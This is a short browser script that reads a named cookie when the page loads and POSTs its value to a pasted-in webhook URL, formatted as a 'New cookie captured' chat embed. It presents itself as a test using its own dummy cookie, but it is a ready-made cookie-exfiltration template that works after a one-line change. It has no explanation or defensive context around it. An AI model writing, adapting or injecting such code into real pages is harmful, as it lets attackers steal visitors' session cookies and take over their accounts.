<script>
const WEBHOOK_URL = 'PASTE_YOUR_WEBHOOK_HERE';

// Get a cookie by name
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

// Update UI
function updateStatus(message, type) {
    const box = document.getElementById("statusBox");
    const text = document.getElementById("statusText");

    text.textContent = message;
    box.style.display = "block";
    box.textContent = message;
    box.className = `status ${type}`;
}

// Send data to webhook
async function sendToWebhook(value, name) {
    try {
        const payload = {
            content: `New cookie captured: ${name}`,
            embeds: [
                {
                    title: "Cookie Data",
                    color: 3447003,
                    fields: [
                        {
                            name: "Value",
                            value: `\`\`\`${value}\`\`\``
                        }
                    ],
                    timestamp: new Date().toISOString()
                }
            ]
        };

        const res = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (res.ok) {
            updateStatus("Sent successfully!", "success");
        } else {
            updateStatus("Failed to send.", "error");
        }

    } catch (err) {
        updateStatus("Error sending request.", "error");
        console.error(err);
    }
}

// MAIN EXECUTION
document.addEventListener("DOMContentLoaded", () => {
    // Example: set your own test cookie first
    document.cookie = "testCookie=hello_world; path=/";

    const cookieValue = getCookie("testCookie");

    if (cookieValue) {
        updateStatus("Cookie found!", "success");
        sendToWebhook(cookieValue, "testCookie");
    } else {
        updateStatus("Cookie not found.", "error");
    }
});
</script>
